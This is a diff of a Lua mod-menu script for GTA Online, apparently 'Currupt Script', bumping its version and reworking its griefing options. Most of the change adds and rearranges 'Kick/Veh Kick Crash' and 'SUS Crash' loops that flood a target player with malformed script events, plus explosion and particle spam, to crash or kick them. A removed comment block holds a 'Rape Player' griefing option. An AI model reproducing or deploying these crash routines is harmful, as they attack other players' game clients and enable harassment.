@@ -37,7 +37,7 @@ util.require_natives("natives-1651208000")
 util.require_natives("natives-1663599433")
 guidedMissile = require("guided_missile")
 
-local a=5.7;if not dev_mode then 
+local a=5.8;if not dev_mode then 
     async_http.init("raw.githubusercontent.com","/Millerrrrrrrrrr/Currupt-Script/main/Currupt Script/CurruptScriptVersion.lua",function(b)
         currentVer=tonumber(b)response=true;if a~=currentVer then 
             menu.action(menu.my_root(),"Update",{"updatecurrupt"},"If it still says update when its been updated just ignore it until you see my change logs in my server.",function()
@@ -45,7 +45,7 @@ local a=5.7;if not dev_mode then
                     local d=select(2,load(c))if d then util.toast("Update failed to download")return end;local e=io.open(filesystem.scripts_dir()..SCRIPT_RELPATH,"wb")e:write(c)e:close()
                         util.toast("Update finished")util.stop_script()end)async_http.dispatch()end)end end,function()response=true end)async_http.dispatch()repeat util.yield()until response end
 
-util.toast("Welcome To Currupt Script 1.3.3\n" .. "\n" .. "Keep your eyes peeled for updates...\n" .. "\n" .. "WARNING! Notifications aren't always accurate")
+util.toast("Welcome To Currupt Script 1.3.4\n" .. "\n" .. "Keep your eyes peeled for updates...\n" .. "\n" .. "WARNING! Notifications aren't always accurate")
 
 util.log("░█████╗░██╗░░░██╗██████╗░██████╗░██╗░░░██╗██████╗░████████╗  ░██████╗░█████╗░██████╗░██╗██████╗░████████╗")
 util.log("██╔══██╗██║░░░██║██╔══██╗██╔══██╗██║░░░██║██╔══██╗╚══██╔══╝  ██╔════╝██╔══██╗██╔══██╗██║██╔══██╗╚══██╔══╝")
@@ -65,9 +65,6 @@ util.log("▒▒▒▒▄▄▄██▒▒█▀█▀█▒▒██▄▄▄�
 util.log("▒▒▒▒▀▀██▒▒▒▒▒▒▒▒▒▒▒██▀▀▒▒▒▒")
 util.log("▒▒▒▒▒▒▀▀▒▒▒▒▒▒▒▒▒▒▒▀▀▒▒▒▒▒▒")
 ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-
-
-	splashes = menu.list(menu.my_root(), "Join Our Discord", {}, "", function(); end)
 
     local translations = {}
     setmetatable(translations, {
@@ -129,7 +126,6 @@ end)
     PlaySound(resources_dir .. "\\bruh.wav", SND_FILENAME | SND_ASYNC)
         end
 
-menu.hyperlink(splashes, "Join The Discord", "https://discord.gg/xhFBQw9vhD")
 --------------------------------------------------------------------------------------
 local script_dir <const> = filesystem.scripts_dir() .. "/lib/smilescript"
 
@@ -598,6 +594,7 @@ players.on_join(function(player_id)
 end)
 
 ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
 	cargoloops = menu.list(menu.my_root(), "Cargo Loop", {}, "Open Musiness Banager > Special Cargo (Tick all apart from AFK Loop) Then start this cargo loop.", function(); end)
 
 	cargoloo = menu.list(cargoloops, "Open Musiness Banager First", {}, "Open Musiness Banager > Special Cargo (Tick all apart from AFK Loop) Then start this cargo loop.", function(); end)
@@ -752,7 +749,7 @@ my_root:action("Get crates", {"fillcurrentwhouse"}, "", function()
 end)
 local appsecuroserv = util.joaat("appsecuroserv")
 local money_loop = false
-my_root:toggle("Sell crates loop", {"sellcratesloop"}, "Auto-sells the crates of the CURRENTLY SELECTED WAREHOUSE IN MB, and skips errors.", function(on)
+my_root:toggle("Sell crates loop", {"sellcratesloop"}, "Note: Use Keyboard to turn on. Auto-sells the crates of the CURRENTLY SELECTED WAREHOUSE IN MB, and skips transaction errors.", function(on)
     menu.trigger_commands("autoenter")
     money_loop = on
     while true do 
@@ -3315,7 +3312,7 @@ end)
 
 menu.action(helpcommands, "Help Commands", {"helpcommands"}, "", function()
     chat.send_message(
-        "/help1 /help2 /help3 /help4 /help5 /carhelpa /carhelpb /carhelpc /whatmenu /curruptlink",
+        "/help1 /help2 /help3 /help4 /help5 /carhelpa /carhelpb /carhelpc /whatmenu",
         false, -- in team chat
         true, -- add to local history
         true  -- networked
@@ -3325,7 +3322,7 @@ end, nil, nil, COMMANDPERM_FRIENDLY)
 
 menu.toggle_loop(helpcommands, "Help Commands", {"helpcommand"}, "", function(on_toggle)
     chat.send_message(
-        "/help1 /help2 /help3 /help4 /help5 /carhelpa /carhelpb /carhelpc /whatmenu /curruptlink",
+        "/help1 /help2 /help3 /help4 /help5 /carhelpa /carhelpb /carhelpc /whatmenu",
         false, -- in team chat
         true, -- add to local history
         true  -- networked
@@ -3336,30 +3333,6 @@ end)
 menu.toggle_loop(helpcommands, "Type Help Commands", {"typehelpcommand"}, "", function(on_toggle)
     chat.send_message(
         "Type /helpcommands for help",
-        false, -- in team chat
-        true, -- add to local history
-        true  -- networked
-        )
-    util.yield(150000)
-end)
-
-
-
-	curruptlink = menu.list(spams, "Join Currupt Discord Link", {}, "Command: curruptlink", function(); end)
-
-menu.action(curruptlink, "Join Currupt Script Discord Link", {"curruptlink"}, "", function()
-    chat.send_message(
-        "Please Join Currupt Script Discord > discord.gg/xhFBQw9vhD < Open discord hit the + to join server and type my link!",
-        false, -- in team chat
-        true, -- add to local history
-        true  -- networked
-        )
-    util.yield(150000)
-end, nil, nil, COMMANDPERM_FRIENDLY)
-
-menu.toggle_loop(curruptlink, "Join Currupt Script Discord Link", {"curruptlink"}, "", function(on_toggle)
-    chat.send_message(
-        "Please Join Currupt Script Discord > discord.gg/xhFBQw9vhD < Open discord hit the + to join server and type my link!",
         false, -- in team chat
         true, -- add to local history
         true  -- networked
@@ -3592,7 +3565,7 @@ end)
 
 menu.action(whatmenu, "What Menu Do I Use?", {"whatmenu"}, "", function()
     chat.send_message(
-        "I use Stand Ultimate, 2take1 VIP coloaded, Cherax VIP, X-Force, Midnight, Nightfall, Rebound, PhantomX and North",
+        "I use Stand Ultimate, 2take1 VIP coloaded, and I got tons other menu's.",
         false, -- in team chat
         true, -- add to local history
         true  -- networked
@@ -3602,7 +3575,7 @@ end, nil, nil, COMMANDPERM_FRIENDLY)
 
 menu.toggle_loop(whatmenu, "What Menu Do I Use?", {"whatmenu"}, "", function(on_toggle)
     chat.send_message(
-        "I use Stand Ultimate, 2take1 VIP coloaded, Cherax VIP, X-Force, Midnight, Nightfall, Rebound, PhantomX and North",
+        "I use Stand Ultimate, 2take1 VIP coloaded, and I got tons other menu's.",
         false, -- in team chat
         true, -- add to local history
         true  -- networked
@@ -5288,12 +5261,6 @@ local usingRape = false
                 menu.trigger_commands("tp" .. players.get_name(pid))
                 end
                 end)
-            
---      menu.toggle(griefing, "Rape Player", {"rapeplayer"}, "The player won't see you attached to them", function(on)
---      TASK.TASK_PLAY_ANIM(players.user_ped(), "rcmpaparazzo_2", "shag_loop_a", 8.0, -8.0, -1, 1, 0.0, false, false, false)
-
---      menu.toggle(griefing, "Piggy Back", {"piggyback"}, "The player won't see you attached to them", function(on)
---      TASK.TASK_PLAY_ANIM(players.user_ped(), "rcmjosh2", "josh_sitting_loop", 8.0, -8.0, -1, 1, 0.0, false, false, false)
                         
         griefingtp = menu.list(tpoptions, "TP All Players", {}, "", function(); end)
 
@@ -5380,18 +5347,6 @@ local usingRape = false
                 return true
             end
         end
-
-        --[[
-        local inf_loading = menu.list(griefing, "Infinite Loading Screen", {}, "Skidded From Femboy Jinx Hahah.")
-
-        menu.action(inf_loading, "MC Teleport Method", {}, "Skidded From Femboy Jinx Hahah.", function()
-            util.trigger_script_event(1 << pid, {0xDEE5ED91, pid, 0, 32, NETWORK.NETWORK_HASH_FROM_PLAYER_HANDLE(pid), 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
-        end)
-    
-        menu.action(inf_loading, "Apartment Method", {}, "Skidded From Femboy Jinx Hahah.", function()
-            util.trigger_script_event(1 << pid, {0x7EFC3716, pid, 0, 1, id})
-        end)
-         ]]   
 
     attachoptions = menu.list(griefing, "Attach Options", {}, "", function(); end)
 
@@ -5720,23 +5675,23 @@ end)
             end 
     end)
 
---[[
-
-    menu.action(griefing, "Get Key Test", {""}, "", function()
-        if NETWORK.NETWORK_IS_PLAYER_CONNECTED(pid) then
-        menu.get_activation_key_hash(mesage,  PLAYER.GET_PLAYER_NAME(pid, true, 1))
-        util.toast(message, TOAST_ABOVE_MAP, TOAST_LOGGER)
+    menu.toggle_loop(griefing, "Kick/Veh Kick Crash", {"opkick"}, "Vehicle Kick I logged but it can crash stand. if you use it on people with no protections they won't crash. So use it on who ever you like but be aware it attacks menus.", function(on_toggle)
+        local int_min = -2147483647
+        local int_max = 2147483647
+        for i = 1, 15 do
+            util.trigger_script_event(1 << pid, {-852914485, 3, 0, 0, 1, 0, 0, -1, 31799, math.random(int_min, int_max), math.random(int_min, int_max), 
+            math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
+            math.random(int_min, int_max), pid, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
+            util.trigger_script_event(1 << pid, {-852914485, 3, 0, 0, 1, 0, 0, -1, 31799})
         end
-    end, nil, nil, COMMANDPERM_AGGRESSIVE)
-
-    menu.action(griefing, "Get Ip Test", {""}, "", function()
-            util.toast(players.get_connect_ip(pid, true, TOAST_ABOVE_MAP, TOAST_LOGGER))
-            util.toast(players.get_online_ip(pid, true, TOAST_ABOVE_MAP, TOAST_LOGGER))
-            util.toast(players.get_online_port(pid, true, TOAST_ABOVE_MAP, TOAST_LOGGER))
-            util.toast(players.get_connect_ip(pid, true, TOAST_ABOVE_MAP, TOAST_LOGGER))
-    end, nil, nil, COMMANDPERM_AGGRESSIVE)
-
-]]
+        menu.trigger_commands("givesh" .. players.get_name(pid))
+        util.yield()
+        for i = 1, 15 do
+            util.trigger_script_event(1 << pid, {-852914485, 3, 0, 0, 1, 0, 0, -1, 31799, pid, math.random(int_min, int_max)})
+            util.trigger_script_event(1 << pid, {-852914485, 3, 0, 0, 1, 0, 0, -1, 31799})
+            util.trigger_script_event(1 << pid, {-852914485, 3, 0, 0, 1, 0, 0, -1, 31799})
+        end
+    end)
 
     local getPlayerPed = PLAYER.GET_PLAYER_PED
     local getEntityCoords = ENTITY.GET_ENTITY_COORDS
@@ -10373,26 +10328,6 @@ else
 end)
 
 ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
- 
-menu.toggle_loop(crash, "Kick/Veh Kick Crash", {"opkick"}, "Vehicle Kick I logged but it can crash stand. if you use it on people with no protections they won't crash. So use it on who ever you like but be aware it attacks menus.", function(on_toggle)
-    local int_min = -2147483647
-    local int_max = 2147483647
-    for i = 1, 15 do
-        util.trigger_script_event(1 << pid, {-852914485, 3, 0, 0, 1, 0, 0, -1, 31799, math.random(int_min, int_max), math.random(int_min, int_max), 
-        math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
-        math.random(int_min, int_max), pid, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
-        util.trigger_script_event(1 << pid, {-852914485, 3, 0, 0, 1, 0, 0, -1, 31799})
-    end
-    menu.trigger_commands("givesh" .. players.get_name(pid))
-    util.yield()
-    for i = 1, 15 do
-        util.trigger_script_event(1 << pid, {-852914485, 3, 0, 0, 1, 0, 0, -1, 31799, pid, math.random(int_min, int_max)})
-        util.trigger_script_event(1 << pid, {-852914485, 3, 0, 0, 1, 0, 0, -1, 31799})
-        util.trigger_script_event(1 << pid, {-852914485, 3, 0, 0, 1, 0, 0, -1, 31799})
-    end
-end)
-
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 
 local keramicrash = menu.list(lobbycrash, "Kerami Crashes", {}, "")
@@ -12429,36 +12364,38 @@ menu.trigger_commands("poodle"..PLAYER.GET_PLAYER_NAME(pid))
                 end)
 
                 menu.toggle_loop(scrash, "SUS Crash", {"togglesus"}, "This one is bound to hurt.", function(on_toggle)
+
                         local int_min = -2147483647
                         local int_max = 2147483647
                             for i = 1, 15 do
-                                util.trigger_script_event(1 << pid, {548471420, 3, 804923209, 1128590390, 136699892, -168325547, -814593329, 1630974017, 1101362956, 1510529262, 2, 1875285955, 633832161, -1097780228, pid, math.random(int_min, int_max), math.random(int_min, int_max), 
+                                util.trigger_script_event(1 << pid, {879177392, 3, 7264839016258354765, 10597, 73295, 3274114858851387039, 4862623901289893625, 54483, pid, math.random(int_min, int_max), math.random(int_min, int_max), 
                                 math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
                                 math.random(int_min, int_max), pid, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
-                                util.trigger_script_event(1 << pid, {548471420, 3, 804923209, 1128590390, 136699892, -168325547, -814593329, 1630974017, 1101362956, 1510529262, 2, 1875285955, 633832161, -1097780228})
+                                util.trigger_script_event(1 << pid, {879177392, 3, 7264839016258354765, 10597, 73295, 3274114858851387039, 4862623901289893625, 54483})
                                 end
                                 util.yield()
                             for i = 1, 15 do
-                                util.trigger_script_event(1 << pid, {548471420, 3, 804923209, 1128590390, 136699892, -168325547, -814593329, 1630974017, 1101362956, 1510529262, 2, 1875285955, 633832161, -1097780228, pid, math.random(int_min, int_max)})
-                                util.trigger_script_event(1 << pid, {548471420, 3, 804923209, 1128590390, 136699892, -168325547, -814593329, 1630974017, 1101362956, 1510529262, 2, 1875285955, 633832161, -1097780228, math.random(int_min, int_max)})
-                                util.trigger_script_event(1 << pid, {548471420, 3, 804923209, 1128590390, 136699892, -168325547, -814593329, 1630974017, 1101362956, 1510529262, 2, 1875285955, 633832161, -1097780228, pid, math.random(int_min, int_max)})
-                                util.trigger_script_event(1 << pid, {879177392, 3, 7264839016258354765, 10597, 73295, 3274114858851387039, 4862623901289893625, 54483})
-                                end
-                                menu.trigger_commands("notifyspam" .. players.get_name(pid))
-                                menu.trigger_commands("explode" .. players.get_name(pid))
-                                menu.trigger_commands("explodeloop" .. players.get_name(pid))
-                                menu.trigger_commands("explosiondelay".. players.get_name(pid) .. " 50")
-                                menu.trigger_commands("explosionshake".. players.get_name(pid) .. " 10")
-                                menu.trigger_commands("ptfx" .. players.get_name(pid))
-                                menu.trigger_commands("ptfxamount" .. players.get_name(pid) .. " 250")
-                                menu.trigger_commands("ptfxsize" .. players.get_name(pid) .. " 10")
-                                menu.trigger_commands("givesh" .. players.get_name(pid))
-                                util.yield(100)
-                                util.trigger_script_event(1 << pid, {879177392, 3, 7264839016258354765, 10597, 73295, 3274114858851387039, 4862623901289893625, 54483})
-                                util.trigger_script_event(1 << pid, {879177392, 3, 7264839016258354765, 10597, 73295, 3274114858851387039, 4862623901289893625, 54483})
-                                util.trigger_script_event(1 << pid, {879177392, 3, 7264839016258354765, 10597, 73295, 3274114858851387039, 4862623901289893625, 54483})
+                                util.trigger_script_event(1 << pid, {879177392, 3, 7264839016258354765, 10597, 73295, 3274114858851387039, 4862623901289893625, 54483, pid, math.random(int_min, int_max)})
+                                util.trigger_script_event(1 << pid, {879177392, 3, 7264839016258354765, 10597, 73295, 3274114858851387039, 4862623901289893625, 54483, math.random(int_min, int_max)})
+                                util.trigger_script_event(1 << pid, {879177392, 3, 7264839016258354765, 10597, 73295, 3274114858851387039, 4862623901289893625, 54483, pid, math.random(int_min, int_max)})
                                 util.trigger_script_event(1 << pid, {879177392, 3, 7264839016258354765, 10597, 73295, 3274114858851387039, 4862623901289893625, 54483})
                                 util.trigger_script_event(1 << pid, {548471420, 3, 804923209, 1128590390, 136699892, -168325547, -814593329, 1630974017, 1101362956, 1510529262, 2, 1875285955, 633832161, -1097780228})
+                                util.trigger_script_event(1 << pid, {697566862, 3, 10, 9, 1, 1, 1})
+                                util.trigger_script_event(1 << pid, {-1990614866, 0, 0})
+                                util.trigger_script_event(1 << pid, {-904555865, 0, 2291045226935366863, 3941791475669737503, 4412177719075258724, 1343321191, 3457004567006375106, 7887301962187726958, -890968357, 415984063236915669, 1084786880, -452708595, 3922984074620229282, 1929770021948630845, 1437514114, 4913381462110453197, 2254569481770203512, 483555136, 743446330622376960, 2252773221044983930, 513716686466719435, 9003636501510659402, 627697547355134532, 1535056389, 436406710, 4096191743719688606, 4258288501459434149})
+                                end
+                                menu.trigger_commands("explode" .. players.get_name(pid))
+                                util.yield(100)
+                                menu.trigger_commands("explodeloop" .. players.get_name(pid))
+                                util.yield(100)
+                                menu.trigger_commands("explosiondelay".. players.get_name(pid) .. " 50")
+                                menu.trigger_commands("explosionshake".. players.get_name(pid) .. " 10")
+                                util.yield(100)
+                                menu.trigger_commands("givesh" .. players.get_name(pid))
+                                util.trigger_script_event(1 << pid, {548471420, 3, 804923209, 1128590390, 136699892, -168325547, -814593329, 1630974017, 1101362956, 1510529262, 2, 1875285955, 633832161, -1097780228})
+                                util.trigger_script_event(1 << pid, {697566862, 3, 10, 9, 1, 1, 1})
+                                util.trigger_script_event(1 << pid, {-1990614866, 0, 0})
+                                util.trigger_script_event(1 << pid, {-904555865, 0, 2291045226935366863, 3941791475669737503, 4412177719075258724, 1343321191, 3457004567006375106, 7887301962187726958, -890968357, 415984063236915669, 1084786880, -452708595, 3922984074620229282, 1929770021948630845, 1437514114, 4913381462110453197, 2254569481770203512, 483555136, 743446330622376960, 2252773221044983930, 513716686466719435, 9003636501510659402, 627697547355134532, 1535056389, 436406710, 4096191743719688606, 4258288501459434149})
                 notification("SUS Crash sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
                             end)
 
